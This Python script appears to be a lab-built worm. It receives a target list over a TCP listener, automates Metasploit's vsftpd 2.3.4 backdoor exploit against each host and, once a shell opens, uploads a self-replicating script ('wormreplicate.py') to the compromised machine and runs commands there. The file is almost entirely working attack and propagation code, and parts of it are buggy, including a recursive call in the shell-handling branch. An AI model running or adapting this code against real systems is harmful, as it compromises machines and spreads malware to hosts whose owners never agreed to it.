#!python3
from nclib import TCPServer
import subprocess

def listener():

	server = TCPServer(("192.168.56.108", 1337))
	for client in server:
		target_list = client.recv()

		target_list = str(target_list.rstrip())

		target_list = target_list[3:-2]

		target_list = target_list.split(',')

		print(target_list)
		return target_list

def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	print("post exploit")
	process = subprocess.Popen(["msfconsole", "-q", "-x", exploit], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	while True:
		response = str(process.stdout.readline().rstrip())
		print(response)
		if "Command shell session 1 opened" in response:
			response = str(process.stdout.readline().rstrip())
			print(response)
			print("inside if")
			
			byteshell = 'upload /home/peyton/Documents/Worm/wormreplicate.py /wormreplicate7.py'.encode('utf-8')
			#byteshell = ''.encode('utf-8')
			print(byteshell)
			out = process.communicate(input=byteshell, timeout=1000)
			
			generate(target)#copy whole function, have it do the shell stuff
			process.communicate(input=b'shell')
			process.communicate(input=b'cd /; echo test > test')


			#out = process.stdin.write(byteshell)

			for i in out:
				print(i)

			print("after communicate", out)

			break
	#subprocess.PIPE("upload /home/peyton/Documents/Worm/wormreplicate.py /")
	

	
#target_list = listener()
target_list = ['192.168.56.112']
for target in target_list:
	generate(target)
